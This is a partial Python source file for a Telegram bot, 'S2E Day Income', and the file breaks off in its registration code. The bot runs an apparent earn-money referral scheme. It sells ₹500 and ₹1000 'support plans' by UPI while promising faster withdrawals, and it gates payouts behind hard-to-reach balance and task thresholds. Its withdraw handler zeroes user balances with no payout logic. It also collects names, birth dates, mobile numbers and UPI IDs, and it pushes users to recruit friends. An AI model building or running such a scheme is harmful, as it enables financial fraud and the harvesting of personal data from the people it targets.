"""
S2E DAY INCOME - FINAL COMPLETE BOT
Includes: Withdraw Conditions, Daily Task Verify, Referral After First Task, Auto Form, Support Plans, Mobile, Anti-Duplicate, Rejoin Check, Contact Us, Admin Panel

SETUP IN RENDER ENV:
BOT_TOKEN = your bot token
CHANNEL_USERNAME = @s2edayincome
CHANNEL_LINK = https://t.me/s2edayincome
ADMIN_UPI = your UPI ID (e.g., 98765@ybl)
SUPPORT_USERNAME = @s2edayincome
SUPPORT_LINK = https://t.me/s2edayincome
ADMIN_IDS = your Telegram ID (get from @userinfobot) e.g., 8544307598
DEPOSIT_LINK_BASIC = optional Razorpay link for ₹500
DEPOSIT_LINK_PREMIUM = optional Razorpay link for ₹1000
"""
import os, re, threading
from datetime import date, datetime
from flask import Flask
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, ConversationHandler, ContextTypes, filters

BOT_TOKEN = os.getenv("BOT_TOKEN")
CHANNEL_USERNAME = os.getenv("CHANNEL_USERNAME", "@s2edayincome")
CHANNEL_LINK = os.getenv("CHANNEL_LINK", "https://t.me/s2edayincome")
ADMIN_UPI = os.getenv("ADMIN_UPI", "s2edayincome@upi")
SUPPORT_USERNAME = os.getenv("SUPPORT_USERNAME", "@s2edayincome")
SUPPORT_LINK = os.getenv("SUPPORT_LINK", "https://t.me/s2edayincome")
ADMIN_IDS = os.getenv("ADMIN_IDS", "8544307598")
ADMIN_ID_LIST = [int(x.strip()) for x in ADMIN_IDS.split(",") if x.strip().isdigit()]
DEPOSIT_LINK_BASIC = os.getenv("DEPOSIT_LINK_BASIC", f"upi://pay?pa={ADMIN_UPI}&pn=S2E&am=500&cu=INR&tn=Basic%20Support")
DEPOSIT_LINK_PREMIUM = os.getenv("DEPOSIT_LINK_PREMIUM", f"upi://pay?pa={ADMIN_UPI}&pn=S2E&am=1000&cu=INR&tn=Premium%20Support")

app_flask = Flask(__name__)
@app_flask.route('/')
def home(): return "S2E Bot Live! Final Version 🚀"
def run_flask():
    port = int(os.environ.get("PORT", 10000))
    app_flask.run(host="0.0.0.0", port=port)

NAME, GENDER, DOB, MOBILE, UPI, PINCODE, PROFESSION, SUPPORT_MSG = range(8)

users_db = {}
referrals_db = {}
tasks_db = {}
daily_done = {}
pending_referrals = {}
user_plans = {}
bonus_balance = {}
banned_users = set()

def is_admin(uid): return uid in ADMIN_ID_LIST
def calculate_age(d): 
    today=date.today()
    return today.year-d.year-((today.month,today.day)<(d.month,d.day))
def get_balance(uid): return referrals_db.get(uid,0)*10 + tasks_db.get(uid,0)*5 + bonus_balance.get(uid,0)
def get_tasks(uid): return referrals_db.get(uid,0) + tasks_db.get(uid,0)
def is_duplicate_mobile(mobile, exclude_uid=None):
    for uid, data in users_db.items():
        if uid != exclude_uid and data.get('mobile') == mobile: return True
    return False
def is_duplicate_upi(upi, exclude_uid=None):
    for uid, data in users_db.items():
        if uid != exclude_uid and data.get('upi','').lower() == upi.lower(): return True
    return False
async def check_channel_member(user_id, context):
    try:
        member = await context.bot.get_chat_member(chat_id=CHANNEL_USERNAME, user_id=user_id)
        return member.status not in ['left', 'kicked']
    except: return False

def main_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("👥 My Referrals", callback_data="my_ref"), InlineKeyboardButton("💰 Wallet", callback_data="wallet")],
        [InlineKeyboardButton("📅 Daily Task", callback_data="daily"), InlineKeyboardButton("💸 Withdraw", callback_data="withdraw")],
        [InlineKeyboardButton("💎 Support Plans", callback_data="support_plans"), InlineKeyboardButton("📞 Contact Us", callback_data="contact_us")]
    ])

def join_channel_keyboard(is_rejoin=False):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📢 Join Channel - Step 1", url=CHANNEL_LINK)],
        [InlineKeyboardButton("✅ I Joined - Continue", callback_data="check_joined")]
    ])

# USER HANDLERS
async def my_ref_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q=update.callback_query; await q.answer()
    uid=q.from_user.id
    if uid in banned_users: await q.message.reply_text("🚫 Banned!"); return
    if not await check_channel_member(uid, context):
        await q.message.reply_text("❌ You left channel! Rejoin.", reply_markup=join_channel_keyboard(True)); return
    cnt=referrals_db.get(uid,0)
    await q.message.reply_text(f"👥 My Referrals\n\nVerified (after 1st task): {cnt}\nEarning: ₹{cnt*10}\n\nLink: https://t.me/{context.bot.username}?start={uid}\n\nReward only after friend completes first task.", reply_markup=main_menu())

async def wallet_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q=update.callback_query; await q.answer()
    uid=q.from_user.id
    if uid in banned_users: return
    if not await check_channel_member(uid, context):
        await q.message.reply_text("❌ Rejoin channel!", reply_markup=join_channel_keyboard(True)); return
    bal=get_balance(uid); tasks=get_tasks(uid)
    await q.message.reply_text(f"💰 Wallet\n\nBalance: ₹{bal}\nTasks: {tasks}/15\nPlan: {user_plans.get(uid,'Free Plan')}\nStatus: {'🔓 Eligible' if bal>=200 and tasks>=15 else '🔒 Locked'}\n\nConditions:\n• ₹200 {'✅' if bal>=200 else f'❌ Need ₹{200-bal} more'}\n• 15 Tasks {'✅' if tasks>=15 else f'❌ {tasks}/15'}", reply_markup=main_menu())

async def daily_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q=update.callback_query; await q.answer()
    uid=q.from_user.id
    if uid in banned_users: return
    if not await check_channel_member(uid, context):
        await q.message.reply_text("❌ Rejoin channel!", reply_markup=join_channel_keyboard(True)); return
    today=str(date.today())
    if daily_done.get(uid)==today:
        await q.message.reply_text(f"📅 Daily Task\n✅ Already completed today!\nTasks: {get_tasks(uid)}/15\nCome back tomorrow!", reply_markup=main_menu()); return
    kb=InlineKeyboardMarkup([[InlineKeyboardButton("📢 Join Sponsor Channel", url=CHANNEL_LINK)],[InlineKeyboardButton("✅ I Completed - Verify Now", callback_data="daily_verify")],[InlineKeyboardButton("❌ Cancel", callback_data="back_menu")]])
    await q.message.reply_text(f"📅 Today's Daily Task\n\nTask: Join sponsor channel + Share referral link to 1 friend\nReward: ₹5 + 1 Task\n\nClick Verify only after completing. Fake will be detected.", reply_markup=kb)

async def daily_verify_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q=update.callback_query; await q.answer()
    uid=q.from_user.id
    if uid in banned_users: return
    if not await check_channel_member(uid, context):
        await q.message.reply_text("❌ Not in channel! Join first.", reply_markup=join_channel_keyboard(True)); return
    today=str(date.today())
    if daily_done.get(uid)==today:
        await q.message.reply_text("📅 Already completed!", reply_markup=main_menu()); return
    try:
        m=await context.bot.get_chat_member(chat_id=CHANNEL_USERNAME, user_id=uid)
        if m.status in ['left','kicked']:
            await q.message.reply_text("❌ Verification Failed! You haven't joined channel.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📢 Join", url=CHANNEL_LINK), InlineKeyboardButton("✅ Verify Again", callback_data="daily_verify")]])); return
    except: pass
    daily_done[uid]=today
    is_first = tasks_db.get(uid,0)==0 and referrals_db.get(uid,0)==0
    tasks_db[uid]=tasks_db.get(uid,0)+1
    ref_id=pending_referrals.get(uid)
    if ref_id and is_first:
        referrals_db[ref_id]=referrals_db.get(ref_id,0)+1
        try: await context.bot.send_message(chat_id=ref_id, text=f"🎉 Referral Verified! Your friend completed first task. +₹10 Added! Total: {referrals_db[ref_id]}")
        except: pass
        del pending_referrals[uid]
    await q.message.reply_text(f"📅 Daily Task Verified! ✅\n\n+ ₹5 Added!\nTasks: {get_tasks(uid)}/15\nBalance: ₹{get_balance(uid)}\n\nCome back tomorrow!", reply_markup=main_menu())

async def support_plans_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q=update.callback_query; await q.answer()
    if not await check_channel_member(q.from_user.id, context):
        await q.message.reply_text("❌ Rejoin to access plans.", reply_markup=join_channel_keyboard(True)); return
    kb=InlineKeyboardMarkup([[InlineKeyboardButton("📦 Basic Support - ₹500", callback_data="plan_basic")],[InlineKeyboardButton("👑 Premium Full Support - ₹1000", callback_data="plan_premium")],[InlineKeyboardButton("🔙 Back", callback_data="back_menu")]])
    await q.message.reply_text(f"💎 S2E Support Plans\n\n📦 BASIC SUPPORT - ₹500\n• Priority Support\n• Withdrawal Help\n• 30 Days Validity\n\n👑 PREMIUM FULL SUPPORT - ₹1000\n• Everything in Basic\n• Personal Mentoring\n• Instant Withdrawal Support\n• 90 Days + Bonus ₹100\n\nSelect plan to get deposit link:", reply_markup=kb)

async def plan_basic_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q=update.callback_query; await q.answer()
    kb=InlineKeyboardMarkup([[InlineKeyboardButton("💳 Pay ₹500 Now (UPI)", url=DEPOSIT_LINK_BASIC)],[InlineKeyboardButton("✅ I Have Paid - Verify", callback_data="verify_basic")],[InlineKeyboardButton("🔙 Back", callback_data="support_plans")]])
    await q.message.reply_text(f"📦 Basic Support - ₹500\n\nDeposit Link:\n{DEPOSIT_LINK_BASIC}\nUPI: {ADMIN_UPI}\n\nAfter payment send screenshot to {SUPPORT_USERNAME}", reply_markup=kb)

async def plan_premium_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q=update.callback_query; await q.answer()
    kb=InlineKeyboardMarkup([[InlineKeyboardButton("💳 Pay ₹1000 Now (UPI)", url=DEPOSIT_LINK_PREMIUM)],[InlineKeyboardButton("✅ I Have Paid - Verify", callback_data="verify_premium")],[InlineKeyboardButton("🔙 Back", callback_data="support_plans")]])
    await q.message.reply_text(f"👑 Premium Full Support - ₹1000\n\nDeposit Link:\n{DEPOSIT_LINK_PREMIUM}\n\nBonus ₹100 instantly!\nSend screenshot to {SUPPORT_USERNAME}\nUPI: {ADMIN_UPI}", reply_markup=kb)

async def verify_plan_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q=update.callback_query; await q.answer()
    uid=q.from_user.id
    plan="Basic Support ₹500" if "basic" in q.data else "Premium Full Support ₹1000"
    user_plans[uid]=plan
    if "premium" in q.data: bonus_balance[uid]=bonus_balance.get(uid,0)+100
    await q.message.reply_text(f"✅ {plan} Payment Received (Pending Verification)!\nPlease send payment screenshot to {SUPPORT_USERNAME} for quick verification.\nYour plan: {plan}\nBalance: ₹{get_balance(uid)}", reply_markup=main_menu())

async def withdraw_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q=update.callback_query; await q.answer()
    uid=q.from_user.id
    if uid in banned_users: return
    if not await check_channel_member(uid, context):
        await q.message.reply_text("❌ Rejoin channel to withdraw.", reply_markup=join_channel_keyboard(True)); return
    bal=get_balance(uid); tasks=get_tasks(uid); upi=users_db.get(uid,{}).get('upi','Not Set')
    if bal<200 or tasks<15:
        msg=f"💸 Withdrawal - Not Eligible ❌\n\nYour Status:\n💰 Balance: ₹{bal} / ₹200 {'✅' if bal>=200 else f'❌ Need ₹{200-bal} more'}\n📋 Tasks: {tasks} / 15 {'✅' if tasks>=15 else f'❌ Need {15-tasks} more'}\n\nTo increase balance: Invite friends (₹10 after their 1st task) + Daily Tasks (₹5/day)\nTo complete tasks: Daily Task every day + Invite friends"
        await q.message.reply_text(msg, reply_markup=main_menu()); return
    kb=InlineKeyboardMarkup([[InlineKeyboardButton(f"✅ Confirm Withdraw ₹{bal} to {upi}", callback_data=f"confirm_withdraw_{bal}")],[InlineKeyboardButton("❌ Cancel", callback_data="back_menu")]])
    await q.message.reply_text(f"💸 Withdrawal Eligible! ✅\n\nBalance: ₹{bal}\nTasks: {tasks}/15 ✅\nUPI: {upi}\n\nConfirm? Payment within 24 hours.", reply_markup=kb)

async def confirm_withdraw_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q=update.callback_query; await q.answer()
    uid=q.from_user.id
    if not await check_channel_member(uid, context):
        await q.message.reply_text("❌ Rejoin first.", reply_markup=join_channel_keyboard(True)); return
    bal=get_balance(uid); upi=users_db.get(uid,{}).get('upi','')
    referrals_db[uid]=0; tasks_db[uid]=0; bonus_balance[uid]=0
    await q.message.reply_text(f"✅ Withdrawal Request Submitted!\n\nAmount: ₹{bal}\nUPI: {upi}\nStatus: Pending ⏳\nWill be processed within 24 hours. Keep earning!", reply_markup=main_menu())

async def contact_us_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q=update.callback_query; await q.answer()
    kb=InlineKeyboardMarkup([[InlineKeyboardButton("💬 Message Admin", url=SUPPORT_LINK)],[InlineKeyboardButton("📢 Our Channel", url=CHANNEL_LINK)],[InlineKeyboardButton("✉️ Send Support Message", callback_data="send_support_msg")],[InlineKeyboardButton("🔙 Back", callback_data="back_menu")]])
    await q.message.reply_text(f"📞 Contact Us - S2E Day Income\n\nWe are here to help 24/7!\n\n👤 Support: {SUPPORT_USERNAME}\n🔗 Link: {SUPPORT_LINK}\n📢 Channel: {CHANNEL_USERNAME}\n\n📝 Common Issues:\n• Withdrawal delay - Contact with UPI ID\n• Referral not counted - Must complete first task\n• Premium Plans payment - Send screenshot\n• Channel join issue - Send Telegram ID\n\n⏰ Support Hours: 10 AM - 8 PM IST\n⚡ Reply within 2 hours!", reply_markup=kb)

async def send_support_msg_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q=update.callback_query; await q.answer()
    await q.message.reply_text("✉️ Type your support message and send:\n\nType /cancel to cancel.")
    return SUPPORT_MSG

async def get_support_msg(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid=update.effective_user.id; msg=update.message.text.strip()
    user_info = users_db.get(uid, {}); name = user_info.get('name','Unknown'); mobile = user_info.get('mobile','N/A')
    await update.message.reply_text(f"✅ Support Message Sent!\n\n\"{msg}\"\n\nForwarded to {SUPPORT_USERNAME}.\nAdmin will reply within 2 hours.\nYou can also directly message: {SUPPORT_LINK}", reply_markup=main_menu())
    for admin_id in ADMIN_ID_LIST:
        try: await context.bot.send_message(chat_id=admin_id, text=f"🆘 SUPPORT MSG\nFrom: {name} ({uid})\nMobile: {mobile}\nUsername: @{update.effective_user.username}\n\n{msg}\n\nBalance: ₹{get_balance(uid)}\nTasks: {get_tasks(uid)}/15\n\nQuick: /approve {uid} | /reject {uid} | /userinfo {uid} | /addmoney {uid} 100")
        except: pass
    return ConversationHandler.END

async def cancel_support(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Cancelled.", reply_markup=main_menu())
    return ConversationHandler.END

async def back_menu_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q=update.callback_query; await q.answer()
    await q.message.reply_text("S2E Menu:", reply_markup=main_menu())

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid=update.effective_user.id
    if uid in banned_users:
        await update.message.reply_text("🚫 You are banned! Contact support if mistake.")
        return
    is_member = await check_channel_member(uid, context)
    if context.args and len(context.args)>0:
        try:
            ref_id=int(context.args[0])
            if ref_id!=uid and uid not in users_db: pending_referrals[uid]=ref_id
        except: pass
    if uid in users_db and users_db[uid].get("registered"):
        if not is_member:
            await update.message.reply_text(f"⚠️ You left the channel!\n\nYou were registered as {users_db[uid]['name']}, but you left. Rejoin to continue. Balance ₹{get_balance(uid)} safe.", reply_markup=join_channel_keyboard(True))
            return
        await update.message.reply_text(f"Welcome back {users_db[uid]['name']} ✅\n\n💰 Balance: ₹{get_balance(uid)}\n📋 Tasks: {get_tasks(uid)}/15\n🔗 Your Link: https://t.me/{context.bot.username}?start={uid}\nPlan: {user_plans.get(uid,'Free Plan')}", reply_markup=main_menu())
        return
    if not is_member:
        await update.message.reply_text(f"Welcome to S2E Day Income! 🚀\n\nTo start you must join channel first!\n\nStep 1: Join Channel\nStep 2: Return here and click 'I Joined'", reply_markup=join_channel_keyboard(False))
        return
    kb=InlineKeyboardMarkup([[InlineKeyboardButton("✅ Start Registration - Auto", callback_data="check_joined")]])
    await update.message.reply_text(f"✅ Channel Joined!\n\nWelcome! Now start registration (18+ only) - Auto form will start, no need to type /start again!", reply_markup=kb)

async def check_joined_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q=update.callback_query; await q.answer()
    uid=q.from_user.id
    if uid in banned_users: await q.message.reply_text("🚫 Banned!"); return ConversationHandler.END
    if not await check_channel_member(uid, context):
        await q.message.reply_text("❌ You haven't joined yet! Join and try again.", reply_markup=join_channel_keyboard(False))
        return ConversationHandler.END
    if uid in users_db and users_db[uid].get("registered"):
        await q.message.reply_text("✅ Already registered! Welcome back.", reply_markup=main_menu())
        return ConversationHandler.END
    users_db[uid]={}
    await q.message.reply_text(f"✅ Verification Successful! 🎉\n\nAuto registration starts! No need to type commands.\n\n📝 Registration (18+ only) - Step 1/7\n1️⃣ Enter your Full Name:")
    return NAME

async def get_name(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid=update.effective_user.id; name=update.message.text.strip()
    if len(name)<2: await update.message.reply_text("Please enter valid full name:"); return NAME
    if uid in banned_users: return ConversationHandler.END
    users_db[uid]['name']=name
    kb=ReplyKeyboardMarkup([["Male","Female","Other"]], one_time_keyboard=True, resize_keyboard=True)
    await update.message.reply_text(f"Hi {name}! 👋\n\n2️⃣ Select your Gender:", reply_markup=kb)
    return GENDER

async def get_gender(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid=update.effective_user.id; g=update.message.text.strip()
    if g not in ["Male","Female","Other"]: await update.message.reply_text("Please select from buttons: Male / Female / Other"); return GENDER
    users_db[uid]['gender']=g
    await update.message.reply_text("3️⃣ Enter your Date of Birth (DD-MM-YYYY)\nExample: 15-08-2000\nAge must be 18+", reply_markup=ReplyKeyboardRemove())
    return DOB

async def get_dob(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid=update.effective_user.id; txt=update.message.text.strip()
    try:
        dob=datetime.strptime(txt, "%d-%m-%Y").date(); age=calculate_age(dob)
        if age<18: await update.message.reply_text(f"❌ You are {age} years old. 18+ only! Enter valid DOB:"); return DOB
    except:
        await update.message.reply_text("❌ Invalid format! Use DD-MM-YYYY\nExample: 15-08-2000"); return DOB
    users_db[uid]['dob']=txt; users_db[uid]['age']=age
    await update.message.reply_text(f"✅ Age verified: {age} years\n\n4️⃣ Enter Mobile Number (10 digits):\nExample: 9876543210")
    return MOBILE

async def get_mobile(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid=update.effective_user.id; mob=update.message.text.strip()
    mob_clean = re.sub(r'\D', '', mob)
    if mob_clean.startswith('91') and len(mob_clean)==12: mob_clean=mob_clean[2:]
    if not re.match(r'^[6-9]\d{9}$', mob_clean):
        await update.message.reply_text("❌ Invalid Mobile!\nEnter 10 digit Indian mobile starting with 6-9\nExample: 9876543210"); return MOBILE
    if is_duplicate_mobile(mob_clean, exclude_uid=uid):
        await update.message.reply_text(f"❌ Mobile {mob_clean} already registered with another account!\nEnter different number. Duplicate not allowed."); return MOBILE
    users_db[uid]['mobile']=mob_clean
    await update.message.reply_text(f"✅ Mobile verified: {mob_clean}\n\n5️⃣ Enter UPI ID for payments:\nExample: yourname@phonepe")
    return UPI

async def get_upi(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid=update.effective_user.id; 
